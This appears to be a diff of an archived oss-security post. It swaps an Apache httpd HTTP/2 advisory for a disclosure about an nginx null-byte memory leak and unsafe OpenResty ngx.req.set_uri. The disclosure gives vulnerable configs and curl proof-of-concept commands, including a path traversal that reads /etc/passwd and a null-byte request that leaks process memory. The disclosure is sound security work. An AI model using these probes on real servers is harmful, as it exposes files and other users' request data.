@@ -1,35 +1,156 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/08/07/3
-Message-ID: <1596799898.LUXZKPQK@httpd.apache.org>
-Date: Fri, 07 Aug 2020 06:31:38 -0500
-From: Daniel Ruggeri <druggeri@...che.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/03/18/1
+Message-ID: <c429fb15-5af8-e56f-01ec-674b10ec3e7b@securityvulns.ru>
+Date: Wed, 18 Mar 2020 16:10:32 +0300
+From: Vladimir Dubrovin <vlad@...urityvulns.ru>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2020-11993: Apache httpd: Push Diary Crash on Specifically Crafted HTTP/2 Header
+Subject: Insecure implementation of OpenResty ngx.req.set_uri + memory content leak in nginx.
 Content-Type: text/plain; charset=utf-8
 
+OpenResty is LUA engine for nginx reverse proxy.
 
-CVE-2020-11993: Push Diary Crash on Specifically Crafted HTTP/2 Header
+Affected versions: tested on nginx-1.17.5 and openresty-1.15.8.2 on
+ubuntu 18.04
 
-Severity: moderate
+Two independent problems were identified in OpenResty and nginx,
+potentially leading to different security vulnerabilities: Header
+injection/CRLF injection, directory traversal/local file read,
+restrictions bypass, memory content disclosure in some nginx + openresty
+configurations:
 
-Vendor: Apache Software Foundation
+1. There is a bug in nginx "rewrite" implementation. It can disclose the
+fragment of the process memory with 301/302 HTTP reply if rewrite string
+contains ASCII 0 character. Within nginx itself rewrite string is a
+static configuration option, and is not supposed to be manipulated
+externally.
 
-Versions Affected:
-Apache HTTP Server 2.4.20 to 2.4.43
+2. OpenResty implements ngx.req.set_uri() via raw rewrite in nginx
+without any additional filtering or normalization. If used with
+untrusted input it can lead to CRLF/header injection, directory
+traversal/local file read, restrictions bypass. Due to (1) it can also
+lead to memory content disclosure.
 
-Description:
-Apache HTTP Server versions 2.4.20 to 2.4.43
-When trace/debug was enabled for the HTTP/2 module and on
-certain traffic edge patterns, logging statements were made on
-the wrong connection, causing concurrent use of memory pools.
 
-Configuring the LogLevel of mod_http2 above "info" will mitigate this vulnerability for unpatched servers.
+Fix:
+==============
 
-Mitigation:
+As of now, there is no fix for ngx.req.set_uri(), this function must be considered as potentially unsafe.
 
-Credit:
-Felix Wilhelm of Google Project Zero
+Recommendations:
+==============
 
-References:
-https://httpd.apache.org/security/vulnerabilities_24.html#CVE-2020-11993
+Avoid usage of ngx.req.set_uri() with untrusted input or implement strict input filtering.
+
+
+Timeline:
+
+==============
+
+21.03.2019 - Memory content leak reported to Mail.Ru team via H1 by @maxarr in https://hackerone.com/reports/513236
+22.03.2019 - Memory content leak is mitigated on Mail.Ru side
+05.11.2019 - Problem additionally researched by Denis 'KPEBETKA' Denisov and Nikolay Ermishkin of Mail.Ru Security Team, root cause tracked to nginx+openresty.
+07.11.2019 - Reported to nginx team
+08.11.2019 - Acknowledged by nginx team
+13.12.2019 - nginx team reported back the issue is not tracked as a security bug in nginx, secure rewrite will not be provided by nginx API
+16.12.2019 - memory leak bug fixed in nginx master branch
+https://hg.nginx.org/nginx/rev/02a539522be4
+https://github.com/nginx/nginx/commit/a5895eb502747f396d3901a948834cd87d5fb0c3#diff-75916b11f3e6d45e713a6aa9c97cf315
+17.12.2019 - reported to OpenResty team
+17.12.2019 - acknowledged by OpenResty team
+18.03.2020 - disclosed
+
+
+Details:
+
+==============
+
+This configuration demonstrates memory content leak in nginx:
+
+Vulnerable config (^@ is a null byte)
+
+location ~ /memleak {
+    rewrite ^.*$ "^@...fasdfasdfasdfasdfasdfasdfasdfasdfasdfasdasdf";
+}
+
+location / {
+    root html;
+    index index.html index.htm;
+}
+
+curl localhost:8337/memleak -vv
+...
+Location: http://localhost:8337/WjWj
+...
+
+WjWj – is a random peace of memory, usual includes parts of other requests
+
+vulnerable code:
+
+https://github.com/nginx/nginx/blob/4bf4650f2f10f7bbacfe7a33da744f18951d416d/src/http/modules/ngx_http_static_module.c#L77
+
+last = ngx_http_map_uri_to_path(r, &path, &root, 0);
+
+Doesn't handle location with null byte properly
+
+https://github.com/nginx/nginx/blob/5a2ce3f4ee55eb8903aa9481deaaf402d5a2e805/src/http/ngx_http_core_module.c#L1846
+
+last = ngx_cpystrn(last, r->uri.data + alias, r->uri.len - alias + 1);
+
+Writes only null byte to last, not the whole r->uri.data
+
+https://github.com/nginx/nginx/blob/4bf4650f2f10f7bbacfe7a33da744f18951d416d/src/http/modules/ngx_http_static_module.c#L161
+
+if (!clcf->alias && clcf->root_lengths == NULL && r->args.len == 0) {
+
+It's important to get into this conditional branch to get memory leak
+
+https://github.com/nginx/nginx/blob/4bf4650f2f10f7bbacfe7a33da744f18951d416d/src/http/modules/ngx_http_static_module.c#L188
+
+r->headers_out.location->value.len = len;
+
+location length more than was really written, location ends with random
+piece of memory (usually includes part of other HTTP requests).
+
+Example of configuration vulnerable to  memory leak with
+https://github.com/openresty/lua-nginx-module:
+
+location ~ /memleak {
+    rewrite_by_lua_block {
+        ngx.req.read_body();
+        local args, err = ngx.req.get_post_args();
+        ngx.req.set_uri( args["url"], true );
+    }
+}
+
+location / {
+    root html;
+    index index.html index.htm;
+}
+
+curl localhost:8337 -d "url=%00asdfasdfasdfasdfasdfasdfasdfasdf" -vv
+...
+Location: http://localhost:8337/WjWj
+...
+
+Example of configuration vulnerable to directory traversal with
+https://github.com/openresty/lua-nginx-module
+
+location ~ /rewrite {
+    rewrite ^.*$ $arg_x;
+}
+
+location / {
+    root html;
+    index index.html index.htm;
+}
+
+curl localhost:8337/rewrite?x=/../../../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+
+
+-- Vladimir Dubrovin
+
 
